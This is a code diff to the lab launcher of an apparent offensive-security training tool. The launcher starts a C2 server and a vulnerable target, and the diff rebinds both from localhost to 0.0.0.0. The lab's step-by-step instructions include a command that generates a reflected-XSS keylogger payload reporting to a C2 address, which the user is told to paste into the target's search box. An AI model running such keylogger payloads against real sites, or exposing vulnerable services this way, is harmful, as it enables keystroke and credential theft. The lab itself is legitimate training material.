@@ -56,10 +56,15 @@ def run_lab():
     # Build isolated environment
     env = os.environ.copy()
     env['LAB_MODE'] = '1'  # Flag for all child processes
+    env['C2_HOST'] = '0.0.0.0'
     env['C2_PORT'] = str(LAB_C2_PORT)
+    env['TARGET_HOST'] = '0.0.0.0'
     env['C2_LOG_DIR'] = str(LAB_LOG_DIR)
     env['EXXPLOIT_SESSION_FILE'] = str(LAB_SESSION_FILE)
     
+    # Generic IP for instructions (since we don't know the VPS public IP)
+    display_ip = "YOUR_IP_ADDRESS"
+
     # 1. Start C2 Server (isolated)
     # Using module-based execution to avoid path issues
     c2_proc = subprocess.Popen(
@@ -68,7 +73,7 @@ def run_lab():
         stderr=open(LAB_LOG_DIR / 'c2_stderr.log', 'w'),
         env=env
     )
-    console.print(f"[+] [green]C2 Server started[/green] on http://127.0.0.1:{LAB_C2_PORT} (LAB)")
+    console.print(f"[+] [green]C2 Server started[/green] on http://0.0.0.0:{LAB_C2_PORT} (LAB)")
 
     # 2. Start Vulnerable Target (isolated)
     target_proc = subprocess.Popen(
@@ -77,7 +82,7 @@ def run_lab():
         stderr=open(LAB_LOG_DIR / 'target_stderr.log', 'w'),
         env=env
     )
-    console.print(f"[+] [red]Target Application started[/red] on http://127.0.0.1:{LAB_TARGET_PORT} (LAB)")
+    console.print(f"[+] [red]Target Application started[/red] on http://0.0.0.0:{LAB_TARGET_PORT} (LAB)")
     
     time.sleep(2) # Wait for startup
 
@@ -95,24 +100,25 @@ def run_lab():
     # 3. Instructions
     instructions = f"""
 # 🎯 Mission Objective
-Exploit the target application running at **http://localhost:{LAB_TARGET_PORT}**
+Exploit the target application running at **http://{display_ip}:{LAB_TARGET_PORT}**
+*(If running locally, use 127.0.0.1 or localhost)*
 
 ### Step 1: Scan for Vulnerabilities
 Open a NEW terminal and run:
 ```bash
-exxploit scan http://127.0.0.1:{LAB_TARGET_PORT}
+exxploit scan http://{display_ip}:{LAB_TARGET_PORT}
 ```
 
 ### Step 2: Launch Attack
 Use the `payload` command to generate an attack string.
 Example (Reflected XSS):
 ```bash
-exxploit payload keylogger --c2 http://127.0.0.1:{LAB_C2_PORT}
+exxploit payload keylogger --c2 http://{display_ip}:{LAB_C2_PORT}
 ```
 Copy the output and paste it into the **Search** box on the target site.
 
 ### Step 3: Verify Success
-Watch the C2 logs here or open http://127.0.0.1:{LAB_C2_PORT}/health
+Watch the C2 logs here or open http://{display_ip}:{LAB_C2_PORT}/health
     """
     console.print(Markdown(instructions))
     
